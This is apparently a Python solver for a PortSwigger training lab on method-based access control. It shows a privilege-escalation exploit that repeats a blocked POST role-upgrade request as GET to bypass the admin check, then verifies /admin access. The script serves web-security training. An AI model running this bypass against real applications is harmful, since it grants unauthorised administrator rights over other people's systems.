# Lab 06 — Method-based access control can be circumvented
# PortSwigger: https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented
#
# Vulnerability: Access control is only enforced for one HTTP method (POST);
#                the same handler is reachable via GET with no check applied
# Aim:           Use GET instead of POST to upgrade wiener's own role to admin
#
# Technique:
#   POST /admin-roles with action=upgrade is correctly blocked for non-admins.
#   Convert the same request to GET with parameters in the query string —
#   many frameworks route GET and POST to the same handler, but the access
#   check here was written to apply only to the POST case.
#
# Usage: python access_control_lab06.py <url>

import sys
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, check_status

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 06 — METHOD-BASED ACCESS CONTROL BYPASS (POST → GET)")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab06.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm POST is blocked for a non-admin ──────────────────────
    print("\n  ── Step 1: confirm POST /admin-roles is blocked (non-admin)\n")
    r_post = session.post(
        f"{url}/admin-roles",
        data={"username": "wiener", "action": "upgrade"}
    )
    check_status(r_post, [401, 403], "POST role upgrade attempt")

    # ── Step 2: try the same action via GET ───────────────────────────────────
    print("\n  ── Step 2: try the same action via GET instead\n")
    r_get = session.get(
        f"{url}/admin-roles",
        params={"username": "wiener", "action": "upgrade"}
    )
    check_status(r_get, 200, "GET role upgrade attempt")

    if r_get.status_code != 200:
        print("\n  ?  GET alone didn't work — some apps also need 'confirmed=true'")
        print("     Trying GET with confirmed=true as well...\n")
        r_get2 = session.get(
            f"{url}/admin-roles",
            params={"username": "wiener", "action": "upgrade", "confirmed": "true"}
        )
        check_status(r_get2, 200, "GET role upgrade with confirmed=true")

    # ── Step 3: verify escalation ──────────────────────────────────────────────
    print("\n  ── Step 3: verify escalation by checking /admin access\n")
    r_admin = session.get(f"{url}/admin")
    check_status(r_admin, 200, "Access to /admin after method bypass")

    print()
    print("  ℹ  The handler was reachable via GET; the access-control check")
    print("     was written to apply specifically to the POST code path.")
